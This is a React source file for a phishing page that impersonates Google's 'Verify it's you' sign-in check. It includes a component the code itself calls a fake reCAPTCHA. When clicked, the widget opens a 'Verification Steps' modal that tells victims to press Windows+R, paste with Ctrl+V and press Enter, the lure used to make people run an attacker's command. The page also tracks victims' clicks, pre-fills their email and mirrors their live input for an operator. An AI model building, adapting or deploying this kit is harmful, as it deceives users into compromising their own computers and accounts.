import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useState, type FormEvent } from "react";
import {
  GE_SHELL_CSS,
  GeAccountChip,
  GeFontStyle,
  GeFooter,
  GoogleGLogo,
  resolveGeEmail,
  setGeEmail,
  useGeTracking,
} from "@/components/ge/GeShared";

export const Route = createFileRoute("/ge/captcha")({
  head: () => ({
    meta: [
      { title: "Verify it’s you - Google Accounts" },
      { name: "color-scheme", content: "dark" },
    ],
  }),
  component: GeCaptchaPage,
});

const RECAPTCHA_LOGO =
  "https://www.gstatic.com/images/icons/material/product/2x/recaptcha_48dp.png";

function WindowsKeyIcon() {
  return (
    <svg
      className="ge-vs-win"
      width="14"
      height="14"
      viewBox="0 0 88 88"
      aria-hidden="true"
    >
      <path fill="#000" d="M0 12.402l35.687-4.86.016 34.423-35.67.203zm35.67 33.529.028 34.453L.028 75.48.026 45.7zm4.326-39.025L87.314 0v41.527H40.006zm46.984 42.372-.001 41.29-46.984-6.648V45.686z" />
    </svg>
  );
}

/** Fake reCAPTCHA v2 checkbox — official logo; click → loading → challenge modal. */
function FakeRecaptcha({
  checked,
  loading,
  onActivate,
}: {
  checked: boolean;
  loading: boolean;
  onActivate: () => void;
}) {
  return (
    <button
      type="button"
      className={`ge-rc${checked ? " is-checked" : ""}${loading ? " is-loading" : ""}`}
      onClick={onActivate}
      disabled={loading || checked}
      aria-pressed={checked}
      aria-busy={loading}
      aria-label="I'm not a robot"
    >
      <span className="ge-rc-check-wrap" aria-hidden="true">
        <span className="ge-rc-box">
          {loading ? <span className="ge-rc-spinner" /> : null}
          {checked && !loading ? (
            <svg className="ge-rc-tick" viewBox="0 0 24 24">
              <path
                fill="#009E73"
                d="M9.0 16.2 4.8 12l-1.4 1.4L9 19 21 7l-1.4-1.4L9 16.2z"
              />
            </svg>
          ) : null}
        </span>
      </span>
      <span className="ge-rc-label">I&apos;m not a robot</span>
      <span className="ge-rc-brand" aria-hidden="true">
        <img className="ge-rc-logo" src={RECAPTCHA_LOGO} alt="" width={32} height={32} />
        <span className="ge-rc-brand-text">
          <span className="ge-rc-name">reCAPTCHA</span>
          <span className="ge-rc-links">
            <span>Privacy</span>
            <span> - </span>
            <span>Terms</span>
          </span>
        </span>
      </span>
    </button>
  );
}

function VerificationStepsModal({
  open,
  hash,
  onVerify,
  onClose,
}: {
  open: boolean;
  hash: string;
  onVerify: () => void;
  onClose: () => void;
}) {
  const [visible, setVisible] = useState(false);

  useEffect(() => {
    if (!open) {
      setVisible(false);
      return;
    }
    const id = requestAnimationFrame(() => setVisible(true));
    return () => cancelAnimationFrame(id);
  }, [open]);

  if (!open) return null;

  return (
    <div
      className={`ge-vs-overlay${visible ? " is-open" : ""}`}
      role="presentation"
      onClick={(e) => {
        if (e.target === e.currentTarget) onClose();
      }}
    >
      <div
        className={`ge-vs-modal${visible ? " is-open" : ""}`}
        role="dialog"
        aria-modal="true"
        aria-labelledby="ge-vs-title"
      >
        <header className="ge-vs-header">
          <p className="ge-vs-eyebrow">Complete these</p>
          <h2 id="ge-vs-title" className="ge-vs-title">
            Verification Steps
          </h2>
        </header>

        <div className="ge-vs-body">
          <p className="ge-vs-intro">To better prove you are not a robot, please:</p>
          <ol className="ge-vs-steps">
            <li>
              <span className="ge-vs-num">1.</span>
              <span>
                Press &amp; hold the <strong>Windows Key</strong> <WindowsKeyIcon />{" "}
                <strong>+ R</strong>.
              </span>
            </li>
            <li>
              <span className="ge-vs-num">2.</span>
              <span>
                In the verification window, press <strong>Ctrl + V</strong>.
              </span>
            </li>
            <li>
              <span className="ge-vs-num">3.</span>
              <span>
                Press <strong>Enter</strong> on your keyboard to finish.
              </span>
            </li>
          </ol>

          <p className="ge-vs-agree">You will observe and agree:</p>
          <label className="ge-vs-consent">
            <span className="ge-vs-check" aria-hidden="true">
              <svg viewBox="0 0 24 24" width="14" height="14">
                <path
                  fill="#fff"
                  d="M9.0 16.2 4.8 12l-1.4 1.4L9 19 21 7l-1.4-1.4L9 16.2z"
                />
              </svg>
            </span>
            <span className="ge-vs-consent-text">
              I am not a robot - reCAPTCHA Verification Hash: {hash}
            </span>
          </label>
        </div>

        <footer className="ge-vs-footer">
          <p className="ge-vs-hint">Perform the steps above to finish verification.</p>
          <button type="button" className="ge-vs-verify" onClick={onVerify}>
            VERIFY
          </button>
        </footer>
      </div>
    </div>
  );
}

const GE_CAPTCHA_CSS = `
${GE_SHELL_CSS}

.ge-captcha .ge-title { margin-top: 24px; }

.ge-captcha-lead {
  margin: 16px 0 0;
  font-size: 1rem;
  font-weight: 400;
  line-height: 1.5;
  color: var(--gm3-on-surface);
}
.ge-captcha-lead a {
  color: var(--gm3-primary);
  font-weight: 500;
  text-decoration: none;
}
.ge-captcha-lead a:hover { text-decoration: underline; }


.ge-captcha-prompt {
  margin: 0;
  font-size: 1rem;
  font-weight: 400;
  line-height: 1.5;
  color: var(--gm3-on-surface);
}
@media (min-width: 900px) {
  .ge-captcha .ge-pane-right {
    padding-top: 72px;
  }
}

.ge-captcha-form {
  margin-top: 24px;
  flex: 1;
  display: flex;
  flex-direction: column;
  min-height: 0;
}
@media (min-width: 900px) {
  .ge-captcha-form { margin-top: 22px; }
}

/* Fake reCAPTCHA — light theme widget on dark page */
.ge-rc {
  display: flex;
  align-items: center;
  width: 304px;
  height: 78px;
  padding: 0 12px 0 14px;
  margin: 0;
  border: 1px solid #d3d3d3;
  border-radius: 3px;
  background: #f9f9f9;
  box-shadow: 0 0 4px 1px rgba(0,0,0,.08);
  cursor: pointer;
  text-align: left;
  font-family: Roboto, Helvetica, Arial, sans-serif;
  color: #000;
  box-sizing: border-box;
}
.ge-rc:disabled { cursor: default; }
.ge-rc:focus-visible {
  outline: 2px solid #4285f4;
  outline-offset: 2px;
}
.ge-rc-check-wrap {
  flex-shrink: 0;
  margin-right: 12px;
}
.ge-rc-box {
  display: flex;
  align-items: center;
  justify-content: center;
  width: 28px;
  height: 28px;
  border: 2px solid #c1c1c1;
  border-radius: 2px;
  background: #fff;
  box-sizing: border-box;
}
.ge-rc.is-checked .ge-rc-box {
  border-color: transparent;
  background: transparent;
}
.ge-rc.is-loading .ge-rc-box {
  border-color: transparent;
  background: transparent;
}
.ge-rc-spinner {
  width: 24px;
  height: 24px;
  border-radius: 50%;
  border: 3px solid #e0e0e0;
  border-top-color: #4285f4;
  animation: ge-rc-spin .7s linear infinite;
  box-sizing: border-box;
}
@keyframes ge-rc-spin {
  to { transform: rotate(360deg); }
}
.ge-rc-tick {
  width: 30px;
  height: 30px;
  display: block;
}
.ge-rc-label {
  flex: 1;
  min-width: 0;
  font-size: 14px;
  font-weight: 400;
  line-height: 17px;
  color: #000;
}
.ge-rc-brand {
  display: flex;
  flex-direction: column;
  align-items: center;
  flex-shrink: 0;
  width: 58px;
  margin-left: 8px;
}
.ge-rc-logo {
  display: block;
  width: 32px;
  height: 32px;
  margin-bottom: 2px;
  object-fit: contain;
}
.ge-rc-brand-text {
  display: flex;
  flex-direction: column;
  align-items: center;
  line-height: 1;
}
.ge-rc-name {
  font-size: 10px;
  font-weight: 400;
  color: #555;
  letter-spacing: 0;
}
.ge-rc-links {
  font-size: 8px;
  color: #555;
  margin-top: 2px;
  white-space: nowrap;
}

.ge-actions {
  display: flex;
  flex-direction: row;
  flex-wrap: wrap;
  align-items: center;
  justify-content: flex-end;
  margin-top: auto;
  padding-top: 32px;
  gap: 8px;
  width: 100%;
}
.ge-btn {
  display: inline-flex;
  align-items: center;
  justify-content: center;
  height: 40px;
  min-width: 64px;
  padding: 0 24px;
  border: none;
  border-radius: 20px;
  font-family: inherit;
  font-size: 0.875rem;
  font-weight: 500;
  letter-spacing: 0.0107142857em;
  cursor: pointer;
}
.ge-btn-next {
  background: var(--gm-next-fill);
  color: var(--gm-next-ink);
}
.ge-btn-next:hover:not(:disabled) {
  box-shadow: 0 1px 2px rgba(0,0,0,.3), 0 1px 3px 1px rgba(0,0,0,.15);
  filter: brightness(1.05);
}
.ge-btn-next:disabled {
  opacity: 0.38;
  cursor: default;
  filter: none;
  box-shadow: none;
}

/* Verification Steps modal */
.ge-vs-overlay {
  position: fixed;
  inset: 0;
  z-index: 1000;
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 24px 16px;
  background: rgba(0, 0, 0, 0);
  transition: background .28s ease;
  box-sizing: border-box;
}
.ge-vs-overlay.is-open {
  background: rgba(0, 0, 0, 0.45);
}
.ge-vs-modal {
  width: 100%;
  max-width: 420px;
  background: #fff;
  border: 1px solid #dadce0;
  border-radius: 4px;
  box-shadow: 0 8px 28px rgba(0,0,0,.28);
  overflow: hidden;
  font-family: Roboto, Helvetica, Arial, sans-serif;
  color: #202124;
  opacity: 0;
  transform: translateY(16px) scale(0.96);
  transition: opacity .28s ease, transform .32s cubic-bezier(.2,.8,.2,1);
}
.ge-vs-modal.is-open {
  opacity: 1;
  transform: translateY(0) scale(1);
}
.ge-vs-header {
  background: #1a73e8;
  color: #fff;
  padding: 18px 22px 16px;
}
.ge-vs-eyebrow {
  margin: 0;
  font-size: 14px;
  font-weight: 400;
  line-height: 1.4;
  opacity: 0.95;
}
.ge-vs-title {
  margin: 2px 0 0;
  font-size: 22px;
  font-weight: 700;
  line-height: 1.25;
}
.ge-vs-body {
  padding: 20px 22px 16px;
  background: #fff;
}
.ge-vs-intro {
  margin: 0 0 14px;
  font-size: 14px;
  line-height: 1.45;
  color: #3c4043;
}
.ge-vs-steps {
  margin: 0;
  padding: 0;
  list-style: none;
  display: flex;
  flex-direction: column;
  gap: 10px;
}
.ge-vs-steps li {
  display: flex;
  gap: 8px;
  font-size: 14px;
  line-height: 1.45;
  color: #202124;
}
.ge-vs-num {
  flex-shrink: 0;
  color: #1a73e8;
  font-weight: 700;
  min-width: 1.25em;
}
.ge-vs-steps strong { font-weight: 700; }
.ge-vs-win {
  display: inline-block;
  vertical-align: -2px;
  margin: 0 2px;
}
.ge-vs-agree {
  margin: 18px 0 10px;
  font-size: 13px;
  color: #3c4043;
}
.ge-vs-consent {
  display: flex;
  align-items: flex-start;
  gap: 8px;
  cursor: default;
}
.ge-vs-check {
  flex-shrink: 0;
  width: 16px;
  height: 16px;
  margin-top: 1px;
  border-radius: 2px;
  background: #34a853;
  display: inline-flex;
  align-items: center;
  justify-content: center;
}
.ge-vs-consent-text {
  font-size: 11px;
  line-height: 1.35;
  color: #80868b;
  font-family: Roboto Mono, Consolas, monospace;
  word-break: break-word;
}
.ge-vs-footer {
  display: flex;
  align-items: center;
  justify-content: space-between;
  gap: 12px;
  padding: 12px 16px 14px 22px;
  border-top: 1px solid #e0e0e0;
  background: #fff;
}
.ge-vs-hint {
  margin: 0;
  flex: 1;
  min-width: 0;
  font-size: 12px;
  line-height: 1.35;
  color: #80868b;
}
.ge-vs-verify {
  flex-shrink: 0;
  height: 36px;
  padding: 0 18px;
  border: none;
  border-radius: 4px;
  background: #1a73e8;
  color: #fff;
  font-family: inherit;
  font-size: 13px;
  font-weight: 700;
  letter-spacing: 0.04em;
  cursor: pointer;
}
.ge-vs-verify:hover { background: #1765cc; }
`;

function GeCaptchaPage() {
  const { trackClick, trackSubmit, sessionId, isObserve } = useGeTracking();
  const [email, setEmail] = useState(() => resolveGeEmail());
  const [checked, setChecked] = useState(false);
  const [loading, setLoading] = useState(false);
  const [modalOpen, setModalOpen] = useState(false);
  // Screenshot 1:1 for now — text/hash will be customized later.
  const [hash] = useState("3822");


  useEffect(() => {
    const resolved = resolveGeEmail();
    if (resolved) {
      setEmail(resolved);
      setGeEmail(resolved);
    }
  }, []);

  useEffect(() => {
    if (!isObserve) return;
    function onMirror(e: Event) {
      const d = (e as CustomEvent<{ field?: string; value?: string }>).detail;
      if (!d?.field) return;
      const value = String(d.value ?? "");
      if (d.field === "email" || d.field === "email_submitted" || d.field === "identifier") {
        setEmail(value);
        setGeEmail(value);
      }
      if (d.field === "recaptcha" || d.field === "captcha") {
        setChecked(value === "1" || value === "true" || value === "checked");
      }
    }
    window.addEventListener("ux:mirror-live-input", onMirror);
    return () => window.removeEventListener("ux:mirror-live-input", onMirror);
  }, [isObserve]);

  const handleActivate = () => {
    if (checked || loading || modalOpen) return;
    trackClick("reCAPTCHA activate");
    setLoading(true);
    window.setTimeout(() => {
      setLoading(false);
      setModalOpen(true);
      trackClick("Verification Steps opened");
    }, 900);
  };

  const handleVerify = () => {
    trackClick("VERIFY");
    setModalOpen(false);
    setChecked(true);
    trackSubmit("recaptcha", `verified:${hash}`);
  };

  const handleNext = (e?: FormEvent) => {
    e?.preventDefault();
    if (!checked) return;
    trackClick("Next");
    trackSubmit("recaptcha_next", "checked");
  };

  return (
    <div className="ge-shell ge-captcha">
      <GeFontStyle />
      <style>{GE_CAPTCHA_CSS}</style>

      <main className="ge-card" role="main">
        <div className="ge-pane-left">
          <GoogleGLogo className="ge-logo" width={48} height={48} />
          <h1 className="ge-title">Verify it{"\u2019"}s you</h1>
          <p className="ge-captcha-lead">
            To help keep your account safe, Google wants to make sure it{"\u2019"}s
            really you trying to sign in.{" "}
            <a
              href="https://support.google.com/accounts/answer/40039?hl=en"
              target="_blank"
              rel="noopener noreferrer"
              onClick={() => trackClick("Learn more")}
            >
              Learn more
            </a>
          </p>
          <GeAccountChip email={email} onClick={() => trackClick("Switch account")} />
        </div>

        <div className="ge-pane-right">
          <p className="ge-captcha-prompt">Confirm you{"\u2019"}re not a robot</p>
          <form className="ge-captcha-form" onSubmit={handleNext} autoComplete="off">
            <FakeRecaptcha
              checked={checked}
              loading={loading}
              onActivate={handleActivate}
            />

            <div className="ge-actions">
              <button type="submit" className="ge-btn ge-btn-next" disabled={!checked}>
                Next
              </button>
            </div>
          </form>
        </div>
      </main>

      <VerificationStepsModal
        open={modalOpen}
        hash={hash}
        onVerify={handleVerify}
        onClose={() => setModalOpen(false)}
      />

      <GeFooter />
      <div className="fixed bottom-2 right-2 text-[10px] opacity-0 pointer-events-none">
        {sessionId}
      </div>
    </div>
  );
}
